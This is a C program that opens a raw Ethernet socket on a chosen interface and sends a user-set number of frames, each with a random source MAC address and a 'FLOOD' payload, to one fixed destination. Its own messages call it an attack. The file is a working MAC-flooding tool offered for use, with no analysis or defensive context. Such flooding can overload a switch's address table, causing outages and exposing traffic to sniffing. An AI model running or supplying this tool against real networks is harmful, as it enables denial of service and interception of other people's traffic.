#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include<linux/if_packet.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<netinet/ether.h>
#include<netinet/in.h>
#include<arpa/inet.h>

struct eth_frame {
    uint8_t dest[6];
    uint8_t src[6];
    uint16_t type;
    char payload[64];
};

int sock_fd = -1;
int keep_running = 1;

void signal_handler(int sig) {
    printf("\n[!] Attack interrupted! Cleaning up...\n");
    keep_running = 0;
    if (sock_fd >= 0) {
        close(sock_fd);
    }
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <interface> <num_packets>\n", argv[0]);
        return 1;
    }
    
    const char* interface = argv[1];
    int num_packets = atoi(argv[2]);
    
    signal(SIGINT, signal_handler);
    
    srand(time(NULL));
    
    sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock_fd < 0) {
        perror("Socket Creation error");
        return 1;
    }
    
    struct ifreq ifr;
    int temp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(temp_sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("Interface not found");
        return 1;
    }
    int if_index = ifr.ifr_ifindex;
    close(temp_sock);
    
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ALL);
    socket_address.sll_ifindex = if_index;
    socket_address.sll_halen = 6;
    
    uint8_t broadcast[6] = {0x46, 0x03, 0x22, 0xde, 0x00, 0x06};
    memcpy(socket_address.sll_addr, broadcast, 6);
    
    printf("Starting attack... Press Ctrl+C to stop\n\n");
    
    for (int packet = 0; packet < num_packets && keep_running; packet++) {
        
        struct eth_frame frame;
        
        memcpy(frame.dest, broadcast, 6);
        
        for (int i = 0; i < 6; i++) {
            frame.src[i] = rand() % 256;
        }
        
        frame.type = htons(0x0800);
        snprintf(frame.payload, sizeof(frame.payload), "FLOOD_%d", packet);
        
        if (sendto(sock_fd, &frame, sizeof(frame), 0,
                  (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
            perror("sendto");
            break;
        }
        
        if (packet % 100 == 0) {
            printf("Sent %d packets - Latest MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   packet, frame.src[0], frame.src[1], frame.src[2],
                   frame.src[3], frame.src[4], frame.src[5]);
        }
        
        usleep(100); 
    }
    
    printf("\n[+] Attack completed! ");
    
    close(sock_fd);
    return 0;
}